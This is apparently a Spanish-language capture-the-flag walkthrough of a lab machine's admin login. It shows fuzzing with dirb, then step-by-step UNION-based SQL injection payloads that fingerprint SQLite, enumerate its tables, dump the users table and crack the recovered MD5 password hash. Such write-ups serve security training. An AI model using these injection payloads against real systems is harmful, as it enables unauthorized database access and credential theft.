22/tcp   open  ssh
8000/tcp open  http-alt

-Entramos al puerto 8000 y no hay nada interesante

-Hacemos Fuzzing con gobuster y no encuentra nada de nada

-Probamos a hacer Fuzzing con otra herramienta 
	-dirb http://10.10.10.25:8000
		-admin
	(Por eso la importancia de utilizar distintas herramientas, en este caso gobuster falla)

-Nos vamos a http://10.10.10.25:8000/admin y encontramos un Panel de Login

-Interceptamos la Petición con BurpSuite y probamos SQL Injections (SQLI):
	-Todos los Payloads que probamos nos responde con 'Invalid User' o con 'Error Ocurred', sin embargo, con el siguiente nos sale 'Incorrect Password':
		-username=" OR "" = "&password=test
		-También nos sale esto que antes no nos salía:
			required autofocus value=**"RickA"**

-Probamos a poner 'RickA' como usuario y efectivamente nos responde así:
	-username=RickA&password=test
		Incorrect Password
		(Esto confirma que el usuario existe)

-Parece que hemos bypasseado el campo 'username' y nos ha devuelto un nombre de usuario válido, sin embargo aún no hemos bypasseado el Login.

### Identificamos al BD en uso

-Lo primero es averiguar cuántas columnas tiene la tabla actual:
	-username=")) ORDER BY 1-- -&password=test
		-Respuesta:
			-Invalid User
			(Sale lo mismo con ORDER BY 2,3 y 4)
	-Aquí cambia la Respuesta:
		-username="))ORDER BY 5-- -&password=test
			Error Occurred 

-Con esto sabemos que la tabla tiene 4 Columnas

-Para confirmar que en la cadena 'required autofocus value=' es dónde va a salir el Output:
	-username=")) UNION select 1,"testing",3,4-- -&password=test
		-required autofocus value="testing"
		(Efectivamente, desde aquí vamos a ver el Output)

-Lo siguiente es saber que BD se está utilizando, probamos distintos Payloads:
	-Payload para Mysql:
		-username=")) UNION select 1,@@version,3,4-- -&password=test
			-NO FUNFIONA EN ESTE CASO
	-Payload para PostgrestSQL:
		-username=")) UNION select 1,version(),3,4-- -&password=test
			-NO FUNFIONA EN ESTE CASO
	-Payload para SQLite:
		-username=")) UNION select 1,sqlite_version(),3,4-- -&password=test
			required autofocus value="3.15.0"
			-FUNCIONA!!, nos sale le versión de la BD
			-NOTA: El output solo sale si inyectamos el comando en la 2 columna

-Con esto sabemos que la **BD en uso** es **SQLite**

## Enumeramos la BD SQLite

-Para listar el nombre de la tabla en uso:
	-username=")) UNION select 1,tbl_name,3,4 FROM sqlite_master WHERE type='table'-- -&password=test
		required autofocus value="bookings"

-Para listar todas las tablas de la BD en uso:
	-username=")) UNION SELECT 1, group_concat(tbl_name), 3, 4 FROM sqlite_master WHERE type='table' and tbl_name NOT like 'sqlite_%'-- -&password=test
		required autofocus value="**users,notes,bookings,sessions**"

-Para listar las columnas de la Tabla 'Users':
	-username=")) UNION SELECT 1, sql, 3, 4 FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='users'-- -&password=test
		CREATE TABLE users (id INTEGER PRIMARY KEY AUTOINCREMENT,username TEXT,password TEXT,active TINYINT(1))

-Para ver todos los usuarios de la tabla 'Users':
	-username=")) UNION SELECT 1, group_concat(username), 3, 4 FROM users-- -&password=test
		required autofocus value="RickA"
		-Solo está el usuario 'RickA'

-Para ver la contraseña que le corresponde al único usuario que hay:
	-username=")) UNION SELECT 1, password, 3, 4 FROM users-- -&password=test
		required autofocus value="**fdc8cd4cff2c19e0d1022e78481ddf36**"

-Rompemos el hash con 'Cipher Identifier' , era md5:
	-nevergonnagiveyouup

-Nos vamos al Login y nos autenticamos con las credenciales obtenidas